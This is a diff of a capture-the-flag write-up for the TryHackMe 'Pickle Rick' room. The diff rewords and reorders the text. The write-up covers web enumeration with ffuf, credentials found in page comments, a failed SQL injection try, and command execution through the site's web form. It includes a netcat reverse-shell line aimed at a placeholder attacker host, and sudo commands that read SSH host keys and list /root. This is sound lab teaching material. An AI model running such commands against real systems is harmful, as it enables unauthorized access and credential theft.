@@ -2,7 +2,7 @@
 
 {% embed url="https://tryhackme.com/room/picklerick" %}
 
-When reading the source code in `http://10.10.253.172/`, we found the following username: `R1ckRul3s` within the comments.
+Upon reading the source code in `http://10.10.253.172/`, I found the username `R1ckRul3s` within the comments.
 
 ...
 
@@ -40,31 +40,19 @@ $ ffuf -h -u http://<target>/FUZZ -w .../Apache_common.txt
 ... 
 ```
 
-We found the path `/login.php` .
-
-We are presented with a login page. We can utilize the information we have gathered earlier to discover the username and password of `R1ckRul3s` and `Wubbalubbadubdub` respectively.
+I visited the path `/login.php` , and was presented with a login page. I utilized the information we have gathered earlier to discover the username and password combination of `R1ckRul3s` and `Wubbalubbadubdub` respectively.
 
 **Enumerating the webpage**
 
-Comment found in `/portal.php`:
+&#x20;`/portal.php`:
+
+The following comment was found in the source code:
 
 `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`
 
 This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` . Well, is this a clue, or perhaps a directory path value, name of a file, or simply something just to throw us off?
 
-We are presented with a command line input that accepts commands for a Linux environment.
-
-Upon visiting `/denied.php` ,
-
-We are presented with a message: "Only the REAL rick can view this page." This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?
-
-**SQL Injection attempt**
-
-I attempted a SQL injection attack on the login form, in hopes of potentially discovering the name and password combination of the root, or higher privilege account.
-
-```sql
-...
-```
+The main interface presented an input form that accepts commands for a Linux environment. This form will be used to enumerate the Linux system and find the ingredients.
 
 ### First ingredient
 
@@ -86,6 +74,42 @@ second ingredients
 
 $ less '/home/rick/second ingredients' # 'more' and 'cat' disable
 1 jerry tear
+```
+
+### Third ingredient
+
+I was having difficulty finding the third ingredient from the file system, as most of my attempts at enumerating the directories returned an empty response. Thus, I decided to further enumerate the webpage.
+
+Upon visiting `/denied.php` ,
+
+We are presented with a message: "Only the REAL rick can view this page." This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?
+
+**SQL Injection attempt**
+
+I attempted a SQL injection attack on the login form, in hopes of potentially discovering the name and password combination of the root, or higher privilege account.
+
+```sql
+...
+```
+
+The database used in the system seems to either not use an SQL-based database, or is simply not vulnerable to a SQL injection attack.
+
+I decided to focus my efforts on the shell environment presented in the interface. To provide myself with a more stable shell experience, I tried to establish a remote shell environment through a few methods: reverse shell and SSH connection.
+
+**Attempts to initiate a reverse shell**
+
+```bash
+$ perl ...
+$ ... # bash
+$ ... # python
+$ nc <attacker> [port] -e /bin/sh # netcat
+```
+
+\
+**Attempt to add a new SSH authorized key**&#x20;
+
+```bash
+$ ...
 ```
 
 **Attempts at abusing my `sudo` privileges to view system logs, SSH configurations, etc.**
@@ -110,22 +134,7 @@ $ sudo less /etc/ssh/ssh_host_rsa_key
 
 ```
 
-**Attempts to initiate a reverse shell**
-
-```bash
-$ perl ...
-$ ... # bash
-$ ... # python
-$ nc <attacker> [port] -e /bin/sh # netcat
-```
-
-**Attempt to add a new SSH authorized key**&#x20;
-
-```bash
-$ ...
-```
-
-### Third ingredient
+**Finding the last and final ingredient**
 
 ```bash
 $ sudo ls -la /root
